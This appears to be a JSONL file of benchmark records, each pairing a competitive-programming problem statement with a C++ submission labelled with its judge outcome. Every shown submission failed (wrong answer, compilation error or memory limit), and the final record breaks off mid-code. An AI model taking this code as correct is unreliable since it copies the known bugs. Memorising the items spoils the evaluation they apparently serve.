{"difficulty":1000,"lang":"GNU C++0x","lang_cluster":"c++","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_65","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <algorithm>\n#include <cctype>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <ctime>\n#include <cmath>\n#include <iostream>\n#include <list>\n#include <map>\n#include <queue>\n#include <set>\n#include <string>\n#include <sstream>\n#include <utility>\n#include <vector>\n\nusing namespace std;\n\n#define REP(i, n) for(int i = 0; i < (n); ++i)\n#define FOR(i, a, b) for(int i = (a); i <= (b); ++i)\n#define FORD(i, a, b) for(int i = (a); i >= (b); --i)\n\/\/#define FOREACH(it, c) for(typeof((c).begin()) it = (c).begin(); it != (c).end(); ++it)\n#define ALL(c) (c).begin(), (c).end()\n#define FILL(a, b) memset(a, b, sizeof(a))\n#define mp(x, y) make_pair(x, y);\n#define pb push_back\n#define SZ(c) ((int)(c).size())\n#define X(p) p.first\n#define Y(p) p.second\n#define debug(x) cerr << #x << \" = \" << x << \"\\n\";\n\/\/#define debugv(v) cerr << #v << \" = \"; FOREACH(it, v) cerr << *it << \",\\n\";\n\ntypedef long long ll;\ntypedef long double ld;\ntypedef pair<int, int> pii;\ntypedef pair<double, double> pdd;\ntypedef vector<int> VI;\ntypedef vector<VI> VII; \ntypedef vector<string> VS;\n\nconst int inf = 1000000000;\nconst ll infll = ll(inf) * ll(inf);\nconst double PI = 4 * atan(1.0);\n\ntemplate<class T> string i2s(T x) { ostringstream ss; ss << x; return ss.str(); }\nint s2i(string s) { istringstream ss(s); int x; ss >> x; return x;}\nll s2ll(string s) { istringstream ss(s); ll x; ss >> x; return x;}\n\ninline double dist(double x1, double y1, double x2, double y2) { return sqrt(pow(x1-x2, 2) + pow(y1-y2, 2)); }\n\nint main() {\n\tint cnt[5001];\n\tFILL(cnt, 0);\n\tint n;\n\tcin >> n;\n\tint x;\n\tint ans = 0;\n\tREP(i, n) {\n\t\tcin >> x;\n\t\tif (x > n) ++ans;\n\t\tif (cnt[x]++) ++ans;\n\t}\n\tcout << ans << endl;\n\n\treturn 0;\n}\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_22","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\nusing namespace std;\n\n#define MAXN 100000\n#define MAXS 100\n\nchar flags[MAXN+1];\nchar a[MAXS+1], b[MAXS+1];\nint faila[MAXS], failb[MAXS];\n\nvoid kmpinit(char *s, int len, int *fail) {\n\tfail[0] = -1;\n\tfor (int i=1, pos = -1; i<len; ++i) {\n\t\twhile (pos != -1 && s[pos+1] != s[i]) { pos = fail[pos]; }\n\t\tif (s[pos+1] = s[i]) { ++pos; }\n\t\tfail[i] = pos;\n\t}\n}\n\nbool possible(char *s, int lens, int lena, int lenb) {\n\tint matcha = lens;\n\tfor (int i=0, pos=-1; i<lens; ++i) {\n\t\twhile (pos != -1 && a[pos+1] != s[i]) { pos = faila[pos]; }\n\t\tif (a[pos+1] == s[i]) { ++pos; }\n\t\tif (pos == lena - 1) {\n\t\t\tmatcha = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (matcha >= lens) { return false; }\n\n\tfor (int i=0, pos=-1; i<lens; ++i) {\n\t\twhile (pos != -1 && b[pos+1] != s[i]) { pos = failb[pos]; }\n\t\tif (b[pos+1] == s[i]) { ++pos; }\n\t\tif (pos == lenb - 1) {\n\t\t\tif (i-lenb >= matcha) { return true; }\n\t\t\tpos = failb[pos];\n\t\t}\n\t}\n\n\treturn false;\n}\n\nint main() {\n\tscanf(\"%s\", flags);\n\tscanf(\"%s\", a);\n\tscanf(\"%s\", b);\n\n\tint lena = strlen(a), lenb= strlen(b);\n\tint lenf = strlen(flags);\n\tkmpinit(a, lena, faila);\n\tkmpinit(b, lenb, failb);\n\n\tbool forward = possible(flags, lenf, lena, lenb);\n\treverse(flags, flags+lenf);\n\tbool backward = possible(flags, lenf, lena, lenb);\n\n\tif (forward) {\n\t\tprintf(\"%s\\n\", backward ? \"both\" : \"forward\");\n\t} else {\n\t\tprintf(\"%s\\n\", backward ? \"backward\" : \"fantasy\");\n\t}\n\n\treturn 0;\n\n}\n","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1100,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"d1e381b72a6c09a0723cfe72c0917372","submission_id":"217974067","tags":["implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\r\n \r\nusing namespace std;\r\n \r\nint main()\r\n{\r\n    ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);\r\n    string a,b;\r\n    int flag=0;\r\n    map <char,int> m,m1;\r\n    cin>>a>>b;\r\n    string s=\"\";\r\n    for(int i=0;i<a.size();i++)\r\n    {\r\n        m[a[i]]++;\r\n    }\r\n    for(int i=0;i<b.size();i++)\r\n    {\r\n        m1[b[i]]++;\r\n    }\r\n    for(int i=0;i<10;i++)\r\n    {\r\n        if(m[i]!=m1[i])\r\n        {\r\n            flag=1;\r\n            cout<<\"WRONG_ANSWER\"<<endl;\r\n            break;\r\n        }\r\n    }\r\n    if(flag==0)\r\n    {\r\n        for(int i=1;i<10;i++)\r\n        {\r\n            if(m[(char)(i+48)]!=0)\r\n            {\r\n                for(int j=0;j<m[(char)(i+48)];j++)\r\n                {\r\n                    \r\n                    s=s+(char)(i+48);\r\n                    if(flag==0)\r\n                    {\r\n                        for(int k=0;k<m['0'];k++)\r\n                        s=s+'0';\r\n                        flag=1;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        if(b==s)\r\n        cout<<\"OK\"<<endl;\r\n        else\r\n        cout<<\"WRONG_ANSWER\"<<endl;\r\n    }\r\n}\r\n","description":"One cold winter evening Alice and her older brother Bob was sitting at home near the fireplace and giving each other interesting problems to solve. When it was Alice's turn, she told the number n to Bob and said:\u2014Shuffle the digits in this number in order to obtain the smallest possible number without leading zeroes.\u2014No problem! \u2014 said Bob and immediately gave her an answer.Alice said a random number, so she doesn't know whether Bob's answer is correct. Help her to find this out, because impatient brother is waiting for the verdict.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer n (0\u2009\u2264\u2009n\u2009\u2264\u2009109) without leading zeroes. The second lines contains one integer m (0\u2009\u2264\u2009m\u2009\u2264\u2009109) \u2014 Bob's answer, possibly with leading zeroes.","output_spec":"Print OK if Bob's answer is correct and WRONG_ANSWER otherwise.","notes":null,"sample_inputs":["3310\n1033","4\n5"],"sample_outputs":["OK","WRONG_ANSWER"]}
{"difficulty":1200,"lang":"GNU C++","lang_cluster":"c++","src_uid":"d90da1e932a6aa546bec4e1bd4b1fbec","submission_id":"re_37","tags":["brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\n#include <fstream>\n#include <cstdio>\n#include <math.h>\n#include <queue>\n#include <map>\n#include <stack>\n#include <set>\n#include <string>\n#include <utility>\n#include <cstdlib>\n#include <algorithm>\n#include <cstring>\n#include <ctime>\n#include <vector>                              \nusing namespace std;\n#define fname \"\"\n#define ull unsigned long long\n#define ll long long\n#define INF 1000*1000*1000\n\nint n, x, y, m, i, a[1001], j, mn = INF;\nbool was[1001][1001];\n\nint main () {\n  #ifndef ONLINE_JUDGE\n    freopen (\"a.in\", \"r\", stdin);\n    freopen (\"a.out\", \"w\", stdout);\n    #endif\n    cin >> n >> m;;\n    for (i = 1; i <= n; i++) \n        cin >> a[i];\n    \n    for (i = 1; i <= m; i++) {\n        cin >> x >> y;\n        was[x][y] = true;\n        was[y][x] = true;\n    }\n    for (i =1; i < n-1; i++)\n        for (j = i+1; j < n; j++)\n            for (int k = j+1; k <= n; k++) {\n                if (was[a[i]][a[j]] && was[a[j]][a[k]] && was[a[k]][a[i]])\n                    mn = min(mn, a[i]+a[j]+a[k]);   \n            }\n    if (mn == INF)\n        cout << -1;\n    else\n        cout << mn; \n    return 0;\n}\n","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items (). Next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the prices of the clothing items in rubles. Next m lines each contain a pair of space-separated integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,\u2009vi) are different.","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).","notes":"NoteIn the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.The second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.In the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1","3 2\n2 3 4\n2 3\n2 1","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1"],"sample_outputs":["6","-1","-1"]}
{"difficulty":800,"lang":"GNU C++","lang_cluster":"c++","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_221","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<string.h>\n#include<algorithm>\nusing namespace std;\nint a[111];\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    for(int i=1;i<=n;i++)\n        scanf(\"%d\",a+i);\n    int ansx,ansy,ans=1e9;\n    for(int i=1;i<=n;i++)\n        for(int j=i+1;j<=n;j++)\n            if(i!=j&&abs(a[i]-a[j])<ans)\n        {\n            ans=abs(a[i]-a[j]);\n            ansx=i,ansy=j;\n        }\n    printf(\"%d %d\\n\",ansx,ansy);\n}\n\/*2017-08-03 19:23:27.233*\/","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":1700,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"01eccb722b09a0474903b7e5abc4c47a","submission_id":"207496319","tags":["constructive+algorithms","dp","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<iostream>\r\n#include<vector>\r\n#include<set>\r\n#include<map>\r\n#include \"bits\/stdc++.h\"\r\nusing namespace std;\r\n#define dbg(...)\r\nusing ll = int64_t;\r\n#define space \" | \"\r\n\r\nint cal(int n){\r\n    int bada = n\/2 +1;\r\n    return bada*bada + (bada-1)*(bada-1);\r\n}\r\n\r\nvoid Solution(ll number) {\r\n    \r\n     int n;\r\n     cin>>n;\r\n     for (int i = 1; i < 100; i+=2)\r\n     {\r\n        if(n<=cal(i)){\r\n            cout<<i<<endl;\r\n            return;\r\n        }\r\n     }\r\n     \r\n    \r\n}\r\n\r\n\r\nint32_t main() {\r\n    cin.tie(nullptr)->sync_with_stdio(false);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"C:\\\\Users\\\\sethi\\\\Desktop\\\\Desktop\\\\competitive-programming\\\\input.txt\", \"r\", stdin);\r\n    freopen(\"C:\\\\Users\\\\sethi\\\\Desktop\\\\Desktop\\\\competitive-programming\\\\output.txt\", \"w\", stdout);\r\n#endif\r\n    cout << fixed << setprecision(12);\r\n    ll tc=1; \r\n    \/\/ cin >> tc; \r\n\tfor (ll i = 0; i < tc; i++)\r\n\t{\r\n\t\tSolution(i+1);\r\n\t}\r\n\t\r\n    \r\n    cerr << \"Time:\" << 1000 * ((double)clock()) \/ (double)CLOCKS_PER_SEC << \"ms\\n\";\r\n    return 0;\r\n}\r\n","description":"Consider some square matrix A with side n consisting of zeros and ones. There are n rows numbered from 1 to n from top to bottom and n columns numbered from 1 to n from left to right in this matrix. We'll denote the element of the matrix which is located at the intersection of the i-row and the j-th column as Ai,\u2009j.Let's call matrix A clear if no two cells containing ones have a common side.Let's call matrix A symmetrical if it matches the matrices formed from it by a horizontal and\/or a vertical reflection. Formally, for each pair (i,\u2009j) (1\u2009\u2264\u2009i,\u2009j\u2009\u2264\u2009n) both of the following conditions must be met: Ai,\u2009j\u2009=\u2009An\u2009-\u2009i\u2009+\u20091,\u2009j and Ai,\u2009j\u2009=\u2009Ai,\u2009n\u2009-\u2009j\u2009+\u20091.Let's define the sharpness of matrix A as the number of ones in it.Given integer x, your task is to find the smallest positive integer n such that there exists a clear symmetrical matrix A with side n and sharpness x.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains a single integer x (1\u2009\u2264\u2009x\u2009\u2264\u2009100) \u2014 the required sharpness of the matrix.","output_spec":"Print a single number \u2014 the sought value of n.","notes":"NoteThe figure below shows the matrices that correspond to the samples:  ","sample_inputs":["4","9"],"sample_outputs":["3","5"]}
{"difficulty":2500,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"0a77937c01ac69490f8b478eae77de1d","submission_id":"128465113","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ Hydro submission #613c2a5aebb7bf3ea8994217@1631332954836\n#include<bits\/stdc++.h>\r\nusing namespace std;\r\nconst int N=60;\r\nint n,w[N][N],a[N],f[N][N][N][N];\r\nint main(){\r\n\tscanf(\"%d\",&n);\r\n\tfor(int i=1;i<=n;i++)\r\n\t\tscanf(\"%d\",&a[i]);\r\n\tfor(int i=1;i<=n;i++)\r\n\tfor(int j=1;j<=n-i+1;j++){\r\n\t\tscanf(\"%d\",&w[i][j]);\r\n\t\tif(i==1&&w[i][j]<=a[j])f[i][j][j][j]=a[j];\r\n\t}\r\n\tfor(int i=2;i<=n;i++)\r\n\t\tfor(int j=1;j<=n-i+1;j++)\r\n\t\t\tfor(int k=1;k<=n;k++)\r\n\t\t\t\tfor(int l=k;l<=n;l++){\r\n\t\t\t\t\tfor(int t=k-1;t<=l;t++)\r\n\t\t\t\t\t\tf[i][j][k][l]=max(f[i][j][k][l],f[i-1][j][k][t]+f[i-1][j+1][t+1][l]);\r\n\t\t\t\t\tif(f[i][j][k][l]<w[i][j])f[i][j][k][l]=0;\r\n\t\t\t\t}\r\n\tif(f[n][1][1][n]>0)printf(\"Cerealguy\\n\");\r\n\telse printf(\"Fat Rat\\n\");\r\n\treturn 0;\r\n}","description":"The Fat Rat and his friend \u0421erealguy have had a bet whether at least a few oats are going to descend to them by some clever construction. The figure below shows the clever construction.  A more formal description of the clever construction is as follows. The clever construction consists of n rows with scales. The first row has n scales, the second row has (n\u2009-\u20091) scales, the i-th row has (n\u2009-\u2009i\u2009+\u20091) scales, the last row has exactly one scale. Let's number the scales in each row from the left to the right, starting from 1. Then the value of wi,\u2009k in kilograms (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009k\u2009\u2264\u2009n\u2009-\u2009i\u2009+\u20091) is the weight capacity parameter of the k-th scale in the i-th row. If a body whose mass is not less than wi,\u2009k falls on the scale with weight capacity wi,\u2009k, then the scale breaks. At that anything that the scale has on it, either falls one level down to the left (if possible) or one level down to the right (if possible). In other words, if the scale wi,\u2009k (i\u2009&lt;\u2009n) breaks, then there are at most two possible variants in which the contents of the scale's pan can fall out: all contents of scale wi,\u2009k falls either on scale wi\u2009+\u20091,\u2009k\u2009-\u20091 (if it exists), or on scale wi\u2009+\u20091,\u2009k (if it exists). If scale wn,\u20091 breaks, then all its contents falls right in the Fat Rat's claws. Please note that the scales that are the first and the last in a row, have only one variant of dropping the contents.Initially, oats are simultaneously put on all scales of the first level. The i-th scale has ai kilograms of oats put on it. After that the scales start breaking and the oats start falling down in some way. You can consider everything to happen instantly. That is, the scale breaks instantly and the oats also fall instantly.The Fat Rat is sure that whatever happens, he will not get the oats from the first level. Cerealguy is sure that there is such a scenario, when the rat gets at least some number of the oats. Help the Fat Rat and the Cerealguy. Determine, which one is right.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of rows with scales. The next line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the masses of the oats in kilograms. The next n lines contain descriptions of the scales: the i-th line contains (n\u2009-\u2009i\u2009+\u20091) space-separated integers wi,\u2009k (1\u2009\u2264\u2009wi,\u2009k\u2009\u2264\u2009106) \u2014 the weight capacity parameters for the scales that stand on the i-th row, in kilograms.","output_spec":"Print \"Fat Rat\" if the Fat Rat is right, otherwise print \"Cerealguy\".","notes":"NoteNotes to the examples:   The first example: the scale with weight capacity 2 gets 1. That means that the lower scale don't break.  The second sample: all scales in the top row obviously break. Then the oats fall on the lower row. Their total mass is 4,and that's exactly the weight that the lower scale can \"nearly endure\". So, as 4 \u2009\u2265\u2009 4, the scale breaks.","sample_inputs":["1\n1\n2","2\n2 2\n1 2\n4","2\n2 2\n1 2\n5"],"sample_outputs":["Fat Rat","Cerealguy","Fat Rat"]}
{"difficulty":2300,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"1590da32b7e64d0462550923cce34355","submission_id":"re_600","tags":["dp","greedy","probabilities","sortings","trees"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include <bits\/stdc++.h>\nusing namespace std;\ntypedef long long LL;\nconst int maxn = 1e6+10;\nconst LL mod = 1e9+7;\n\nint n;\nstruct mmp{\n\tLL s;\n\tint to , cc;\n\tbool operator < (const mmp &op) const{\n\t\treturn s > op.s;\n\t}\n}gg;\nvector<mmp> v[maxn];\nLL s[maxn] , ans;\n\nvoid dfs1(int x , int y)\n{\n\tif (v[x].size() == 1 && y != 0) return;\n\tfor (int i = 0 ; i < v[x].size() ; i++)\n\t{\n\t\tint to = v[x][i].to , cc = v[x][i].cc;\n\t\tif (to != y)\n\t\t{\n\t\t\tdfs1(to,x);\n\t\t\ts[to] += cc;\n\t\t\ts[x] += s[to];\n\t\t\tv[x][i].s = s[to];\n\t\t}\n\t}\n\tsort(v[x].begin(),v[x].end());\n}\n\nint dfs2(int x , int y , int p)\n{\n\tans += p;\n\tif (v[x].size() == 1 && y != 0) return p;\n\tfor (int i = 0 ; i < v[x].size() ; i++)\n\t{\n\t\tint to = v[x][i].to , cc = v[x][i].cc;\n\t\tif (to != y)\n\t\t{\n\t\t\tp += cc;\n\t\t\tp = dfs2(to,x,p);\n\t\t\tp += cc;\n\t\t}\n\t}\n\treturn p;\n}\n\nint main()\n{\n\tint i , j , x , y , z;\n\tcin >> n;\n\tfor (i = 1 ; i < n ; i++)\n\t{\n\t\tscanf(\"%d%d%d\",&x,&y,&z);\n\t\tgg.cc = z;\n\t\tgg.to = y;\n\t\tv[x].push_back(gg);\t\n\t\tgg.to = x;\n\t\tv[y].push_back(gg);\n\t}\n\tdfs1(1,0);\n\tdfs2(1,0,0);\n\tlong double sum = ans , div = n-1;\n\tprintf(\"%.10Lf\\n\",sum\/div);\n\treturn 0; \n}\n \t \t\t \t  \t\t\t\t   \t\t\t\t\t\t \t     \t","description":"Gerald is positioned in an old castle which consists of n halls connected with n\u2009-\u20091 corridors. It is exactly one way to go from any hall to any other one. Thus, the graph is a tree. Initially, at the moment of time 0, Gerald is positioned in hall 1. Besides, some other hall of the castle contains the treasure Gerald is looking for. The treasure's position is not known; it can equiprobably be in any of other n\u2009-\u20091 halls. Gerald can only find out where the treasure is when he enters the hall with the treasure. That very moment Gerald sees the treasure and the moment is regarded is the moment of achieving his goal. The corridors have different lengths. At that, the corridors are considered long and the halls are considered small and well lit. Thus, it is possible not to take the time Gerald spends in the halls into consideration. The castle is very old, that's why a corridor collapses at the moment when somebody visits it two times, no matter in which direction. Gerald can move around the castle using the corridors; he will go until he finds the treasure. Naturally, Gerald wants to find it as quickly as possible. In other words, he wants to act in a manner that would make the average time of finding the treasure as small as possible. Each corridor can be used no more than two times. That's why Gerald chooses the strategy in such a way, so he can visit every hall for sure.More formally, if the treasure is located in the second hall, then Gerald will find it the moment he enters the second hall for the first time \u2014 let it be moment t2. If the treasure is in the third hall, then Gerald will find it the moment he enters the third hall for the first time. Let it be the moment of time t3. And so on. Thus, the average time of finding the treasure will be equal to .","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of halls in the castle. Next n\u2009-\u20091 lines each contain three integers. The i-th line contains numbers ai, bi and ti (1\u2009\u2264\u2009ai,\u2009bi\u2009\u2264\u2009n, ai\u2009\u2260\u2009bi, 1\u2009\u2264\u2009ti\u2009\u2264\u20091000) \u2014 the numbers of halls connected with the i-th corridor and the time needed to go along the corridor. Initially Gerald is in the hall number 1. It is guaranteed that one can get from any hall to any other one using corridors.","output_spec":"Print the only real number: the sought expectation of time needed to find the treasure. The answer should differ from the right one in no less than 10\u2009-\u20096.","notes":"NoteIn the first test the castle only has two halls which means that the treasure is located in the second hall. Gerald will only need one minute to go to the second hall from the first one.In the second test Gerald can only go from the first hall to the third one. He can get from the third room to the first one or to the second one, but he has already visited the first hall and can get nowhere from there. Thus, he needs to go to the second hall. He should go to hall 4 from there, because all other halls have already been visited. If the treasure is located in the third hall, Gerald will find it in a minute, if the treasure is located in the second hall, Gerald finds it in two minutes, if the treasure is in the fourth hall, Gerald will find it in three minutes. The average time makes 2 minutes.In the third test Gerald needs to visit 4 halls: the second, third, fourth and fifth ones. All of them are only reachable from the first hall. Thus, he needs to go to those 4 halls one by one and return. Gerald will enter the first of those halls in a minute, in the second one \u2014 in three minutes, in the third one - in 5 minutes, in the fourth one - in 7 minutes. The average time is 4 minutes. ","sample_inputs":["2\n1 2 1","4\n1 3 2\n4 2 1\n3 2 3","5\n1 2 1\n1 3 1\n1 4 1\n1 5 1"],"sample_outputs":["1.0","4.333333333333334","4.0"]}
{"difficulty":1900,"lang":"GNU C++","lang_cluster":"c++","src_uid":"34b67958a37865e1ca0529bbf528dd9a","submission_id":"re_211","tags":["greedy"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include <iostream>\n#include <cstdio>\n#include <algorithm>\n\nusing namespace std;\n\nstring temp, N1, N2, res1, res2;\n\nint stoi(string s) {\n    int res = 0;\n    for(int i = 0;i<s.size();++i)\n        res = 10*res + s[i]-'0';\n    return res;\n}\n\n\nint main() {\n    int res = 0;\n    cin>>N1;\n    N2 = N1;\n    temp = N1;\n    res1 = N1;\n    res2 = N2;\n    sort(N1.begin(),N1.end());\n    \n    do {\n        sort(N2.begin(),N2.end());\n        do {\n            int sum = stoi(N1)+stoi(N2);\n            int cnt = 0;\n            while(sum) {\n                int r = sum%10;\n                if(r == 0) ++cnt;\n                if(r != 0) break;\n                sum\/=10;\n            }\n            if(cnt>res) {\n                res = cnt;\n                res1 = N1;\n                res2 = N2;\n            }\n        }while(next_permutation(N2.begin(),N2.end()));\n    }while(next_permutation(N1.begin(),N1.end()));\n    cout<<res1<<endl;\n    cout<<res2<<endl;\n    return 0;    \n}\n","description":"Andrey's favourite number is n. Andrey's friends gave him two identical numbers n as a New Year present. He hung them on a wall and watched them adoringly.Then Andrey got bored from looking at the same number and he started to swap digits first in one, then in the other number, then again in the first number and so on (arbitrary number of changes could be made in each number). At some point it turned out that if we sum the resulting numbers, then the number of zeroes with which the sum will end would be maximum among the possible variants of digit permutations in those numbers.Given number n, can you find the two digit permutations that have this property?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n \u2014 the original number. The number of digits in this number does not exceed 105. The number is written without any leading zeroes.","output_spec":"Print two permutations of digits of number n, such that the sum of these numbers ends with the maximum number of zeroes. The permutations can have leading zeroes (if they are present, they all should be printed). The permutations do not have to be different. If there are several answers, print any of them.","notes":null,"sample_inputs":["198","500"],"sample_outputs":["981\n819","500\n500"]}
{"difficulty":1900,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"4c2865e4742a29460ca64860740b84f4","submission_id":"206758466","tags":["geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\n#define F(i,a,b) for(int i = a; i < b; i++)\r\n#define FE(i,a,b) for(int i = a; i <= b; i++)\r\n#define FR(i,a,b) for(int i = a; i > b; i--)\r\n#define FRE(i,a,b) for(int i = a; i >= b; i--)\r\n#define ll long long \/\/data types used often, but you don't want to type them time by time\r\n#define ull unsigned long long\r\n#define ui unsigned int\r\n#define us unsigned short\r\n#define FOREACH(i,t) for (auto i=t.begin(); i!=t.end(); i++) \/\/ traverse an STL data structure\r\n#define ALL(c) (c).begin(),(c).end() \/\/handy for function like \"sort()\"\r\n#define IND(e, arr) find(begin(arr), end(arr), e) - begin(arr)\r\n#define IOS ios_base::sync_with_stdio(0); \/\/to synchronize the input of cin and scanf\r\n#define INF 1001001001\r\n#define PI 3.1415926535897932384626\r\n#define mp make_pair\r\n#define fi first\r\n#define se second\r\n#define pb push_back\r\n\r\ntypedef pair<int, int> ii;\r\ntypedef vector<int> vi;\r\ntypedef vector<pair<int, int>> vii;\r\ntypedef vector<vector<int>> vvi;\r\ntypedef vector<bool> vb;\r\n\r\nint dx[4] = {1,0,-1,0};\r\nint dy[4] = {0,1,0,-1};\r\n\r\ntypedef struct{\r\n  int x;\r\n  int y;\r\n} point;\r\n\r\ntypedef struct{\r\n  point center;\r\n  int radius;\r\n} circle;\r\n\r\ntypedef struct{\r\n  point center;\r\n  int inner, outer;\r\n} ring;\r\n\r\nint getSq(int x){\r\n  return x*x;\r\n}\r\n\r\nbool circleIntersect(circle c1, circle c2){\r\n  double dist = sqrt(getSq(c1.center.x-c2.center.x) + getSq(c1.center.y-c2.center.y));\r\n  \/\/cout << dist << 